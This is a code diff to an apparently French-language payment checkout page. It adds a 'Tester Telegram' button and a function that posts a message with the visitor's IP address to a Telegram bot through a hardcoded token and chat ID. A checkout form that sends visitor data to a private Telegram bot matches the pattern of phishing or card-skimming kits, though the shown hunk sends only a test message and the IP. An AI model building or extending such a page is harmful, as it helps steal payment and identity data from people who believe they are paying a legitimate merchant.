@@ -278,6 +278,10 @@
                 <button type="submit" class="pay-button" id="payButton">
                     💳 Payer 99.99€
                 </button>
+                
+                <button type="button" class="pay-button" onclick="testTelegram()" style="background: #28a745; margin-top: 10px;">
+                    🧪 Tester Telegram
+                </button>
 
                 <div class="loading" id="loading">
                     <div class="spinner"></div>
@@ -454,6 +458,57 @@
             } catch {
                 return 'Non disponible';
             }
+        }
+        
+        // Fonction de test Telegram
+        async function testTelegram() {
+            const testButton = event.target;
+            testButton.disabled = true;
+            testButton.textContent = '⏳ Test en cours...';
+            
+            try {
+                const message = `🧪 TEST TELEGRAM
+                
+✅ Connexion réussie !
+🕒 Heure: ${new Date().toLocaleString('fr-FR')}
+🌐 IP: ${await getClientIP()}
+
+Votre bot Telegram fonctionne parfaitement !`;
+
+                const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                if (response.ok) {
+                    testButton.textContent = '✅ Test réussi !';
+                    testButton.style.background = '#28a745';
+                    alert('✅ Message de test envoyé sur Telegram !');
+                } else {
+                    testButton.textContent = '❌ Erreur';
+                    testButton.style.background = '#dc3545';
+                    alert('❌ Erreur: ' + response.status);
+                }
+            } catch (error) {
+                testButton.textContent = '❌ Erreur';
+                testButton.style.background = '#dc3545';
+                alert('❌ Erreur: ' + error.message);
+            }
+            
+            setTimeout(() => {
+                testButton.disabled = false;
+                testButton.textContent = '🧪 Tester Telegram';
+                testButton.style.background = '#28a745';
+            }, 3000);
         }
         
         function showError(message) {
